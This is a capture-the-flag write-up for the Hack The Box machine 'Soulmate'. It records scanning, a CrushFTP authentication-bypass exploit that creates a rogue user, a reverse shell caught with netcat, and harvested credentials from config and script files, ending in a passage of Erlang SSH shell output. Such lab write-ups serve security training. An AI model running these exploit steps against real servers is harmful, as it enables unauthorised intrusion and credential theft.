# [Soulamte] - [HTB]
**Difficulty:** [Easy]  
**OS:** [Linux]  
**Date:** [09/09/2025]  
---

## 1. Summary
- **Objective:** [ ] Capture user flag  
- **Objective:** [ ] Capture root flag / administrator access  
- **Description / Notes:** [Brief overview of the machine, main services, challenges]  
- **Skills Practiced:** 
  - [ ] Enumeration
  - [ ] Web Exploitation
  - [ ] Privilege Escalation

---

## 2. Recon & Enumeration

### 2.1 Network Scanning
```bash
┌──(sabeshan㉿kali)-[~]
└─$ nmap -sS -A -sV -T4 10.10.11.86 -Pn -vv   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 15:01 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:01
Completed Parallel DNS resolution of 1 host. at 15:01, 0.03s elapsed
Initiating SYN Stealth Scan at 15:01
Scanning 10.10.11.86 [1000 ports]
Discovered open port 80/tcp on 10.10.11.86
Discovered open port 22/tcp on 10.10.11.86
Increasing send delay for 10.10.11.86 from 0 to 5 due to 367 out of 917 dropped probes since last increase.
Increasing send delay for 10.10.11.86 from 5 to 10 due to 11 out of 19 dropped probes since last increase.
Completed SYN Stealth Scan at 15:01, 8.96s elapsed (1000 total ports)
Initiating Service scan at 15:01
Scanning 2 services on 10.10.11.86
Completed Service scan at 15:01, 6.49s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.86
Retrying OS detection (try #2) against 10.10.11.86
WARNING: OS didn't match until try #2
Initiating Traceroute at 15:01
Completed Traceroute at 15:01, 0.22s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 15:01
Completed Parallel DNS resolution of 2 hosts. at 15:01, 6.55s elapsed
NSE: Script scanning 10.10.11.86.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 5.40s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.80s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.01s elapsed
Nmap scan report for 10.10.11.86
Host is up, received user-set (0.20s latency).
Scanned at 2025-09-09 15:01:26 IST for 33s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/9%OT=22%CT=1%CU=36309%PV=Y%DS=2%DC=T%G=Y%TM=68BFF40F
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=F1%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M577ST11NW7%O2=M577ST11NW
OS:7%O3=M577NNT11NW7%O4=M577ST11NW7%O5=M577ST11NW7%O6=M577ST11)WIN(W1=FE88%
OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M577N
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Uptime guess: 44.641 days (since Sat Jul 26 23:39:14 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   207.15 ms 10.10.14.1
2   207.05 ms 10.10.11.86

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.01 seconds
           Raw packets sent: 1559 (70.312KB) | Rcvd: 1092 (53.898KB)
```
---
I used to enumerate the dirctory services but I couldn't obtained any but I tried subdomain enumeration i got a subdomain with vulnerable cms
```bash
┌──(sabeshan㉿kali)-[~]
└─$ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://soulmate.htb/ -H "Host: FUZZ.soulmate.htb" -fw 4 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 254ms]
:: Progress: [4989/4989] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
                                                                                                                                                 
┌──(sabeshan㉿kali)-[~]
└─$ searchsploit crushftp       
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
CrushFTP 11.3.1 - Authentication Bypass                                                                        | multiple/remote/52295.py
CrushFTP 7.2.0 - Multiple Vulnerabilities                                                                      | multiple/webapps/36126.txt
CrushFTP < 11.1.0 - Directory Traversal                                                                        | multiple/remote/52012.py
```
---
After I run the authentication bypass with this.

```bash
┌──(myenv)─(sabeshan㉿kali)-[~/HTB/soulmate]
└─$ python3 52295.py --target ftp.soulmate.htb/WebInterface/login.html --port 80 --exploit --new-user hacker --password P@ssw0rd 
 

[36m
  / ____/______  _______/ /_  / ____/ /_____
 / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
\____/_/   \__,_/____/_/ /_/_/    \__/ .___/
                                    /_/
[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
[0m

Exploiting 1 targets with 10 threads...
[+] Successfully created user hacker on ftp.soulmate.htb/WebInterface/login.html
Exploiting targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00

Exploitation complete! Successfully exploited 1/1 targets.

Exploited Targets:
→ ftp.soulmate.htb/WebInterface/login.html

Summary:
Total targets: 1
Vulnerable targets: 0
Exploited targets: 1
```
---
With this i tried to file upload and try to obatimed the reverse shell

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/85f167c4-109d-4012-980d-50911e3a8bdc" />

---
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/269b8493-fc80-4afb-944f-53b4ada67f99" />

---
I generate a random password and log with these creds then i ccan easily upload the shell and gain the reverse shell
Username : ben Password : 7EkTgz
```bash
┌──(myenv)─(sabeshan㉿kali)-[~/HTB/soulmate]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.11.86] 60210
Linux soulmate 5.15.0-153-generic #163-Ubuntu SMP Thu Aug 7 16:37:18 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 07:47:41 up  1:10,  0 users,  load average: 0.01, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1104): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soulmate:/$ python3 -c 'pty;pty.spawn("/bin/bash")'
python3 -c 'pty;pty.spawn("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'pty' is not defined
www-data@soulmate:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@soulmate:/$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                                                 
┌──(myenv)─(sabeshan㉿kali)-[~/HTB/soulmate]
└─$ stty raw -echo; fg                  
[1]  + continued  nc -lvnp 1337

www-data@soulmate:/$ ls -a
.   bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
..  boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var
www-data@soulmate:/$ cd /home
www-data@soulmate:/home$ ls
ben
www-data@soulmate:/home$ cd ben
bash: cd: ben: Permission denied
www-data@soulmate:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Sep  2 10:27 .
drwxr-xr-x 18 root root 4096 Sep  2 10:27 ..
drwxr-x---  3 ben  ben  4096 Sep  2 10:27 ben
www-data@soulmate:/home$ cd /var/www/
www-data@soulmate:~$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Aug 27 09:24 .
drwxr-xr-x 13 root root 4096 Sep  2 10:19 ..
drwxr-xr-x  2 root root 4096 Aug 27 09:25 html
drwxr-xr-x  6 root root 4096 Aug 10 10:39 soulmate.htb
www-data@soulmate:~$ cd soulmate.htb/
www-data@soulmate:~/soulmate.htb$ ls -la
total 24
drwxr-xr-x 6 root     root     4096 Aug 10 10:39 .
drwxr-xr-x 4 root     root     4096 Aug 27 09:24 ..
drwxrwxr-x 2 www-data www-data 4096 Aug 19 11:01 config
drwxrwxr-x 2 www-data www-data 4096 Sep 11 07:39 data
drwxrwxr-x 3 www-data www-data 4096 Sep 11 07:47 public
drwxrwxr-x 3 www-data www-data 4096 Aug 10 07:06 src
www-data@soulmate:~/soulmate.htb$ cd config/
www-data@soulmate:~/soulmate.htb/config$ ls -la
total 12
drwxrwxr-x 2 www-data www-data 4096 Aug 19 11:01 .
drwxr-xr-x 6 root     root     4096 Aug 10 10:39 ..
-rw-r--r-- 1 www-data www-data 2420 Aug 19 11:01 config.php
www-data@soulmate:~/soulmate.htb/config$ cat config.php 
<?php
class Database {
    private $db_file = '../data/soulmate.db';
    private $pdo;

    public function __construct() {
        $this->connect();
        $this->createTables();
    }

    private function connect() {
        try {
            // Create data directory if it doesn't exist
            $dataDir = dirname($this->db_file);
            if (!is_dir($dataDir)) {
                mkdir($dataDir, 0755, true);
            }

            $this->pdo = new PDO('sqlite:' . $this->db_file);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        } catch (PDOException $e) {
            die("Connection failed: " . $e->getMessage());
        }
    }

    private function createTables() {
        $sql = "
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            name TEXT,
            bio TEXT,
            interests TEXT,
            phone TEXT,
            profile_pic TEXT,
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )";

        $this->pdo->exec($sql);

        // Create default admin user if not exists
        $adminCheck = $this->pdo->prepare("SELECT COUNT(*) FROM users WHERE username = ?");
        $adminCheck->execute(['admin']);
        
        if ($adminCheck->fetchColumn() == 0) {
            $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
            $adminInsert = $this->pdo->prepare("
                INSERT INTO users (username, password, is_admin, name) 
                VALUES (?, ?, 1, 'Administrator')
            ");
            $adminInsert->execute(['admin', $adminPassword]);
        }
    }

    public function getConnection() {
        return $this->pdo;
    }
}

// Helper functions
function redirect($path) {
    header("Location: $path");
    exit();
}

function isLoggedIn() {
    return isset($_SESSION['user_id']);
}

function isAdmin() {
    return isset($_SESSION['is_admin']) && $_SESSION['is_admin'] == 1;
}

function requireLogin() {
    if (!isLoggedIn()) {
        redirect('/login');
    }
}

function requireAdmin() {
    requireLogin();
    if (!isAdmin()) {
        redirect('/profile');
    }
}
?>
www-data@soulmate:~/soulmate.htb/config$ cd ../data
www-data@soulmate:~/soulmate.htb/data$ ls -la
total 24
drwxrwxr-x 2 www-data www-data  4096 Sep 11 07:39 .
drwxr-xr-x 6 root     root      4096 Aug 10 10:39 ..
-rw-rw-r-- 1 www-data www-data 16384 Sep 11 07:39 soulmate.db
www-data@soulmate:~/soulmate.htb/data$ 
www-data@soulmate:~/soulmate.htb/data$ sqlite3 soulmate.db  
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .dump;
Error: unknown command or invalid arguments:  "dump;". Enter ".help" for help
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            name TEXT,
            bio TEXT,
            interests TEXT,
            phone TEXT,
            profile_pic TEXT,
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
INSERT INTO users VALUES(1,'admin','$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2',1,'Administrator',NULL,NULL,NULL,NULL,'2025-08-10 13:00:08','2025-08-10 12:59:39');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',2);
COMMIT;
```
---
<img width="1916" height="463" alt="image" src="https://github.com/user-attachments/assets/c2760da4-0035-4fad-8097-32d06c017089" />

---
```bash
www-data@soulmate:/var/log$ cat /usr/local/lib/erlang_login/start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```
---
```bash
ben@soulmate:~$ ss -tulnp
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:4369       0.0.0.0:*          
tcp   LISTEN 0      5          127.0.0.1:2222       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:8443       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:9090       0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:37557      0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:8080       0.0.0.0:*          
tcp   LISTEN 0      128        127.0.0.1:42741      0.0.0.0:*          
tcp   LISTEN 0      511             [::]:80            [::]:*          
tcp   LISTEN 0      128             [::]:22            [::]:*          
tcp   LISTEN 0      4096           [::1]:4369          [::]:*          
ben@soulmate:~$ 
```
---

127.0.0.1:2222 → possibly another SSH/management service.

127.0.0.1:8080 → common for web apps, dashboards, or Tomcat.

127.0.0.1:8443 → HTTPS admin panel (maybe Java app, Jenkins, etc.).

127.0.0.1:9090 → often used for monitoring (Prometheus, Webmin, etc.).

127.0.0.1:4369 → Erlang Port Mapper Daemon (epmd), part of RabbitMQ/Elixir

---
```bash
┌──(sabeshan㉿kali)-[~]
└─$ ssh ben@soulmate.htb
ben@soulmate.htb's password: 
Last login: Sat Sep 13 02:13:05 2025 from 10.10.14.18
ben@soulmate:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben)
ben@soulmate:~$ ssh ben@127.0.0.1 -p 2222
ben@127.0.0.1's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1> help().
(ssh_runner@soulmate)1> help().

** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
f(X)       -- forget the binding of variable X
h()        -- history
h(Mod)     -- help about module
h(Mod,Func)-- help about function in module
h(Mod,Func,Arity) -- help about function with arity in module
ht(Mod)    -- help about a module's types
ht(Mod,Type) -- help about type in module
ht(Mod,Type,Arity) -- help about type with arity in module
hcb(Mod)    -- help about a module's callbacks
hcb(Mod,CB) -- help about callback in module
hcb(Mod,CB,Arity) -- help about callback with arity in module
history(N) -- set how many previous commands to keep
results(N) -- set how many previous command results to keep
catch_exception(B) -- how exceptions are handled
v(N)       -- use the value of query <N>
rd(R,D)    -- define a record
rf()       -- remove all record information
rf(R)      -- remove record information about R
rl()       -- display all record information
rl(R)      -- display record information about R
rp(Term)   -- display Term using the shell's record information
rr(File)   -- read record information from File (wildcards allowed)
rr(F,R)    -- read selected record information from file(s)
rr(F,R,O)  -- read selected record information with options
lf()       -- list locally defined functions
lt()       -- list locally defined types
lr()       -- list locally defined records
ff()       -- forget all locally defined functions
ff({F,A})  -- forget locally defined function named as atom F and arity A
tf()       -- forget all locally defined types
tf(T)      -- forget locally defined type named as atom T
fl()       -- forget all locally defined functions, types and records
save_module(FilePath) -- save all locally defined functions, types and records to a file
bt(Pid)    -- stack backtrace for a process
c(Mod)     -- compile and load module or file <Mod>
cd(Dir)    -- change working directory
flush()    -- flush any messages sent to the shell
help()     -- help info
h(M)       -- module documentation
h(M,F)     -- module function documentation
h(M,F,A)   -- module function arity documentation
i()        -- information about the system
ni()       -- information about the networked system
i(X,Y,Z)   -- information about pid <X,Y,Z>
l(Module)  -- load or reload module
lm()       -- load all modified modules
lc([File]) -- compile a list of Erlang modules
ls()       -- list files in the current directory
ls(Dir)    -- list files in directory <Dir>
m()        -- which modules are loaded
m(Mod)     -- information about module <Mod>
mm()       -- list all modified modules
memory()   -- memory allocation information
memory(T)  -- memory allocation information of type <T>
nc(File)   -- compile and load code in <File> on all nodes
nl(Module) -- load module on all nodes
pid(X,Y,Z) -- convert X,Y,Z to a Pid
pwd()      -- print working directory
q()        -- quit - shorthand for init:stop()
regs()     -- information about registered processes
nregs()    -- information about all registered processes
uptime()   -- print node uptime
xm(M)      -- cross reference check a module
y(File)    -- generate a Yecc parser
** commands in module i (interpreter interface) **
ih()       -- print help for the i module
true
(ssh_runner@soulmate)2> m().
Module                File
application           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application.beam
application_controll  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_controller.beam
application_master    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_master.beam
atomics               preloaded
auth                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/auth.beam
base64                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/base64.beam
beam_a                /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_a.beam
beam_asm              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_asm.beam
beam_block            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_block.beam
beam_call_types       /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_call_types.beam
beam_clean            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_clean.beam
beam_core_to_ssa      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_core_to_ssa.beam
beam_dict             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_dict.beam
beam_digraph          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_digraph.beam
beam_doc              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_doc.beam
beam_flatten          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_flatten.beam
beam_jump             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_jump.beam
beam_lib              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/beam_lib.beam
beam_opcodes          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_opcodes.beam
beam_ssa              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa.beam
beam_ssa_alias        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_alias.beam
beam_ssa_bc_size      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bc_size.beam
beam_ssa_bool         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bool.beam
beam_ssa_bsm          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bsm.beam
beam_ssa_codegen      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_codegen.beam
beam_ssa_dead         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_dead.beam
beam_ssa_destructive  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_destructive_update.beam
beam_ssa_opt          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_opt.beam
beam_ssa_pre_codegen  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_pre_codegen.beam
beam_ssa_recv         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_recv.beam
beam_ssa_share        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_share.beam
beam_ssa_ss           /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_ss.beam
beam_ssa_throw        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_throw.beam
beam_ssa_type         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_type.beam
beam_trim             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_trim.beam
beam_types            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_types.beam
beam_utils            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_utils.beam
beam_validator        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_validator.beam
beam_z                /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_z.beam
binary                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/binary.beam
c                     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/c.beam
cerl                  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl.beam
cerl_clauses          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl_clauses.beam
cerl_trees            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl_trees.beam
code                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/code.beam
code_server           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/code_server.beam
compile               /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/compile.beam
core_lib              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/core_lib.beam
counters              preloaded
crypto                /usr/local/lib/erlang/lib/crypto-5.5.3/ebin/crypto.beam
digraph               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/digraph.beam
digraph_utils         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/digraph_utils.beam
dist_util             /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/dist_util.beam
edlin                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/edlin.beam
edlin_key             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/edlin_key.beam
epp                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/epp.beam
erl_abstract_code     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_abstract_code.beam
erl_anno              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_anno.beam
erl_bifs              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/erl_bifs.beam
erl_distribution      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_distribution.beam
erl_epmd              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_epmd.beam
erl_error             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_error.beam
erl_eval              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_eval.beam
erl_expand_records    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_expand_records.beam
erl_features          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_features.beam
erl_init              preloaded
erl_internal          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_internal.beam
erl_lint              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_lint.beam
erl_parse             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_parse.beam
erl_prim_loader       preloaded
erl_scan              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_scan.beam
erl_signal_handler    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_signal_handler.beam
erl_tracer            preloaded
erlang                preloaded
erpc                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erpc.beam
error_handler         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/error_handler.beam
error_logger          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/error_logger.beam
erts_code_purger      preloaded
erts_dirty_process_s  preloaded
erts_internal         preloaded
erts_literal_area_co  preloaded
erts_trace_cleaner    preloaded
escript               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/escript.beam
ets                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/ets.beam
file                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file.beam
file_io_server        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file_io_server.beam
file_server           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file_server.beam
filename              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/filename.beam
gb_sets               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gb_sets.beam
gb_trees              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gb_trees.beam
gen                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen.beam
gen_event             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_event.beam
gen_server            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_server.beam
gen_statem            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_statem.beam
gen_tcp               /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/gen_tcp.beam
global                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/global.beam
